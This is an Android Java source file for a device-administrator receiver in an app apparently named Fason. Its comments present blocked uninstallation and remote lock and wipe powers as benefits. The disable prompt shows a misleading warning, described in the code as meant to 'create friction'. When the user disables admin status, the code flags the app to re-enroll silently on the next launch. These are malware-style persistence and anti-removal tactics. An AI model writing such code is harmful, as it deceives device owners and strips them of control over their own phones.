package com.fason.app.core;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * FasonDeviceAdminReceiver — grants Device Administrator status.
 *
 * Benefits once active:
 *  • App cannot be uninstalled from Settings > Apps (Uninstall is greyed out)
 *  • Can lock screen, enforce password policy, wipe device remotely
 *  • Cannot be disabled without first deactivating device admin
 *    (requires knowing to go to Settings > Security > Device Admin Apps)
 *
 * Manifest declaration required in <receiver> with BIND_DEVICE_ADMIN permission.
 */
public class FasonDeviceAdminReceiver extends DeviceAdminReceiver {

    private static final String TAG = "DevAdmin";

    public static ComponentName getComponentName(Context ctx) {
        return new ComponentName(ctx, FasonDeviceAdminReceiver.class);
    }

    public static boolean isActive(Context ctx) {
        try {
            DevicePolicyManager dpm =
                (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            return dpm != null && dpm.isAdminActive(getComponentName(ctx));
        } catch (Exception e) { return false; }
    }

    @Override
    public void onEnabled(Context ctx, Intent intent) {
        Log.i(TAG, "Device Admin enabled");
    }

    @Override
    public CharSequence onDisableRequested(Context ctx, Intent intent) {
        // Return a message shown when user tries to deactivate — creates friction
        return "Disabling this will remove security and navigation features.";
    }

    @Override
    public void onDisabled(Context ctx, Intent intent) {
        Log.w(TAG, "Device Admin disabled — re-requesting");
        // Try to re-enroll silently via AutoGrantManager on next launch
        ctx.getSharedPreferences("fason_prefs", Context.MODE_PRIVATE)
           .edit().putBoolean("needs_admin", true).apply();
    }
}
